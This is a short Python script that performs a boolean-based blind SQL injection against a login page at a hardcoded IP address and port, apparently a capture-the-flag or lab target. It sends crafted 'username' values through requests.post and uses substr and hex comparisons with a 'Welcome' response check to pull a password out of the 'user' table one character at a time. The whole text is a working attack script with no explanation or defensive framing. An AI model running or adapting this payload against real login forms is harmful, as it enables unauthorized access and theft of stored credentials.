import requests
import string

wordlist = string.printable
url = "http://143.198.200.16:50621/logins.php"
extracted = ""

while True:
    for char in wordlist:
        payload = f"admin' and hex(substr((select passw0rd from user),{len(extracted)+1},1))=hex('{char}')-- -"
        print("Trying: " + extracted + char)
        r = requests.post(url, data={
            "username": payload,
            "passw0rd": "admin",
            "submit": ""
        })

        if "Welcome" in r.text:
            extracted += char
            print(f"extracted: {extracted}")
            break